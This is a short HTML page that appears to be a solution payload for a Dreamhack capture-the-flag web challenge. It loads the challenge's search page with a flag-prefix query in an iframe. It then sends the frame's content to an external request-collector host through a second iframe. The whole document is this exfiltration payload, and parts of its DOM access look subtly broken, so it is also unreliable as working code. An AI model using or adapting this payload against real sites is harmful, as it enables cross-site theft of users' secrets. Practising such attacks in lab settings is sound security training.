  <script>
    const afterLoad = function() {
          const iframe = document.createElement("iframe")
          iframe.src = "https://xuprdif.request.dreamhack.games/" + document.getElementById("query").contentWindow.document.getElementsByTagName("pre").textContent
          document.body.append(iframe)
      }

  </script>
<html>
  <body>

      <iframe src="http://host8.dreamhack.games:9098/search?query=DH{" id="query" onerror="afterLoad()" onload="afterLoad()"></iframe>
  </body>

</html>
